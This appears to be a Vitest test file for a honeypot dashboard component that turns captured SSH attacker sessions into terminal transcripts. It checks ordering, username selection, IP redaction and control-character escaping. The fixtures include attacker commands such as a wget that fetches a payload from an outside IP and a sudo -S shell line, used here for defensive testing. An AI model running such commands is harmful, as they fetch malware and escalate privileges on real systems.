import { describe, expect, it } from 'vitest'

import { buildTranscript } from '@/components/sessions/useTerminalTranscript'
import type { SessionDetailResponse } from '@/api/generated/types.gen'

function makeSession(over: Partial<SessionDetailResponse> = {}): SessionDetailResponse {
  return {
    id: 'sess-1',
    src_port: 45214,
    dst_port: 2222,
    protocol: 'ssh',
    sensor: 'edge-01',
    country: 'United States',
    country_code: 'US',
    started_at: '2026-05-31T13:40:52+00:00',
    ended_at: '2026-05-31T13:41:50+00:00',
    auth_attempts: [],
    commands: [],
    downloads: [],
    ...over,
  }
}

function cmdText(line: { kind: string; segments?: { text: string }[] }): string {
  return line.segments ? line.segments.map((s) => s.text).join('') : ''
}

describe('buildTranscript', () => {
  it('opens with a connect banner and closes with a duration line', () => {
    const lines = buildTranscript(makeSession())
    expect(lines[0]!.kind).toBe('banner')
    const last = lines.at(-1)!
    expect(last.kind).toBe('closed')
    expect(last.kind === 'closed' && last.text).toContain('58s')
  })

  it('orders events by timestamp; equal-ms ties keep capture order (compound line first)', () => {
    const lines = buildTranscript(
      makeSession({
        auth_attempts: [
          {
            id: 1,
            username: 'admin',
            password: 'admin',
            success: true,
            timestamp: '2026-05-31T13:41:38+00:00',
          },
        ],
        commands: [
          {
            id: 10,
            input: "echo 'admin' | sudo -S sh -c '...'",
            success: true,
            timestamp: '2026-05-31T13:41:49.382+00:00',
          },
          { id: 11, input: 'whoami', success: true, timestamp: '2026-05-31T13:41:49.382+00:00' },
          { id: 12, input: 'cd /tmp', success: true, timestamp: '2026-05-31T13:41:49.384+00:00' },
        ],
      }),
    )
    const cmds = lines.filter((l) => l.kind === 'command')
    expect(cmds).toHaveLength(3)
    expect(cmdText(cmds[0]!)).toContain('sudo')
    expect(cmdText(cmds[1]!)).toBe('whoami')
    expect(cmdText(cmds[2]!)).toBe('cd /tmp')
    const authIdx = lines.findIndex((l) => l.kind === 'auth-ok')
    const firstCmdIdx = lines.findIndex((l) => l.kind === 'command')
    expect(authIdx).toBeGreaterThanOrEqual(0)
    expect(authIdx).toBeLessThan(firstCmdIdx)
  })

  it('uses the first successful username for the prompt', () => {
    const lines = buildTranscript(
      makeSession({
        auth_attempts: [
          {
            id: 1,
            username: 'root',
            password: 'x',
            success: false,
            timestamp: '2026-05-31T13:41:00+00:00',
          },
          {
            id: 2,
            username: 'admin',
            password: 'admin',
            success: true,
            timestamp: '2026-05-31T13:41:01+00:00',
          },
        ],
        commands: [{ id: 5, input: 'id', success: true, timestamp: '2026-05-31T13:41:02+00:00' }],
      }),
    )
    const cmd = lines.find((l) => l.kind === 'command')!
    expect(cmd.kind === 'command' && cmd.user).toBe('admin')
  })

  it('falls back to the last attempted username when no login succeeded', () => {
    const lines = buildTranscript(
      makeSession({
        auth_attempts: [
          {
            id: 1,
            username: 'pi',
            password: 'x',
            success: false,
            timestamp: '2026-05-31T13:41:00+00:00',
          },
        ],
        commands: [{ id: 5, input: 'id', success: true, timestamp: '2026-05-31T13:41:02+00:00' }],
      }),
    )
    const cmd = lines.find((l) => l.kind === 'command')!
    expect(cmd.kind === 'command' && cmd.user).toBe('pi')
  })

  it('redacts IPs in command input and download URLs', () => {
    const lines = buildTranscript(
      makeSession({
        commands: [
          {
            id: 1,
            input: 'wget http://34.11.136.102/meow',
            success: true,
            timestamp: '2026-05-31T13:41:49+00:00',
          },
        ],
        downloads: [
          {
            id: 1,
            url: 'http://34.11.136.102/meow',
            outfile: 'downloads/x',
            sha256: '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
            timestamp: '2026-05-31T13:41:51+00:00',
          },
        ],
      }),
    )
    const cmd = lines.find((l) => l.kind === 'command')!
    expect(cmdText(cmd)).not.toContain('34.11.136.102')
    expect(cmdText(cmd)).toContain('‹ip›')
    const dl = lines.find((l) => l.kind === 'download')!
    expect(dl.kind === 'download' && dl.text).not.toContain('34.11.136.102')
    expect(dl.kind === 'download' && dl.text).toContain('sha256')
  })

  it('escapes attacker control characters (sanitizeAttackerText)', () => {
    const bell = String.fromCharCode(7)
    const lines = buildTranscript(
      makeSession({
        commands: [
          { id: 1, input: `evil${bell}cmd`, success: true, timestamp: '2026-05-31T13:41:49+00:00' },
        ],
      }),
    )
    const cmd = lines.find((l) => l.kind === 'command')!
    expect(cmdText(cmd)).toContain('\\x07')
    expect(cmdText(cmd)).not.toContain(bell)
  })

  it('sorts null-timestamp events last in capture order', () => {
    const lines = buildTranscript(
      makeSession({
        commands: [
          { id: 1, input: 'first', success: true, timestamp: '2026-05-31T13:41:00+00:00' },
          { id: 2, input: 'no-ts-a', success: true, timestamp: null },
          { id: 3, input: 'no-ts-b', success: true, timestamp: null },
        ],
      }),
    )
    const cmds = lines.filter((l) => l.kind === 'command')
    expect(cmds.map((c) => cmdText(c))).toEqual(['first', 'no-ts-a', 'no-ts-b'])
  })

  it('renders a placeholder for downloads with no URL', () => {
    const lines = buildTranscript(
      makeSession({
        downloads: [
          { id: 1, url: null, outfile: null, sha256: null, timestamp: '2026-05-31T13:41:51+00:00' },
        ],
      }),
    )
    const dl = lines.find((l) => l.kind === 'download')!
    expect(dl.kind === 'download' && dl.text).toContain('in-band capture')
  })
})
